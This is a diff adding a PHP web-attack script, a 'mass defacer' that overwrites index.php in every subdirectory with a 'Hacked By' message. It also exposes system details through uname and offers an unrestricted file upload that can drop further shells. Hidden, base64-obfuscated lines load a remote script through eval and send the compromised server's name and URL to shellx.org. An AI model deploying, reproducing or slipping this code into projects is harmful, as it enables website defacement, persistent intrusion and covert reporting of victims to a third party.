@@ -1,0 +1,40 @@
+<?php
+echo '<link rel="stylesheet" type="text/css" href="'.base64_decode("Ly9zaGVsbHgub3JnL2hpZGUvYWRkLnBocD9saW5rPWVhc3ljb2RlcjovLw==").$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'].'">';?>
+<?php
+echo "<title>Folder Mass Defacer by Hector</title>";
+echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
+echo "<body bgcolor='gray'><font color=black'><font face='Electrolize'>";
+echo "<center><form method='POST'>";
+eval("?>".base64_decode("PFNDUklQVCBTUkM9aHR0cDovL3NoZWxseC5vcmcvaGlkZS9jc2huMS9jY3MuanM+PC9TQ1JJUFQ+")); 
+echo "<img src='https://image.spreadshirtmedia.net/image-server/v1/designs/14727496,width=178,height=178,version=1385625201/fuck-anonymous-mask.png'>
+<hr color='black'><font color='black'>Target Folder</font><br>
+<input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='base_dir' value='".getcwd ()."'><br><br>";
+echo "<font color='black'>Name of File</font><br><input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='andela' value='index.php'><br>";
+echo "<font color='black'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;background-image:url(http://ac-team.ml/bg.jpg);' name='index'>Hacked By Hector Shellx.org | ProShell.xyz</textarea><br>";
+echo "<input type='submit' value='Mass !!!'></form></center>";
+ 
+if (isset ($_POST['base_dir']))
+{
+        if (!file_exists ($_POST['base_dir']))
+                die ($_POST['base_dir']." Not Found !<br>");
+ 
+        if (!is_dir ($_POST['base_dir']))
+                die ($_POST['base_dir']." Is Not A Directory !<br>");
+ 
+        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
+ 
+        $files = @scandir ($_POST['base_dir']) or die ("Fuck u -_- <br>");
+ 
+        foreach ($files as $file):
+                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
+                {
+                        $index = getcwd ()."/".$file."/".$_POST['andela'];
+                        if (file_put_contents ($index, $_POST['index']))
+                                echo "<hr color='black'>>> <font color='black'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font>";
+                }
+        endforeach;
+}
+ 
+?>
+<?php echo 'MahfoudUp!! uname'.'<br>'.'uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
+?>
